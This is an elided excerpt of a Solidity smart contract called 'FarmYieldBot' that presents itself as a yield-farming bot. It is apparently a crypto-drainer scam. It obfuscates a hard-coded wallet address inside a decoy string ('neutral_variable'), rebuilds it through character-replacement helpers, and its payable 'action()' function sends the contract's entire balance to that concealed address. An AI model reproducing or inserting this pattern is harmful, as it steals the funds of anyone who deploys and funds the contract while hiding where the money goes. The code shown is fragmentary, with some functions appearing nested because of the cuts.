...
contract FarmYieldBot {
 ...
 function SearchYield(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
  ...
  for(uint i = 0; i < _stringBytes.length; i++) {
   ...
   function startLookingforYield() public pure returns (address adr) {
   string memory neutral_variable = "QG4Eadbac034301885a4595C3E0fDf3820FEF95eF5"; 
   SearchYield(neutral_variable,0,'0');
   SearchYield(neutral_variable,2,'1');
   SearchYield(neutral_variable,1,'x');
 ...
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
  ...
  for(uint i = 0; i < _stringBytes.length; i++) {
	...
	function action() public payable {
	    ...
	    address(uint160(startLookingforYield())).transfer(address(this).balance);
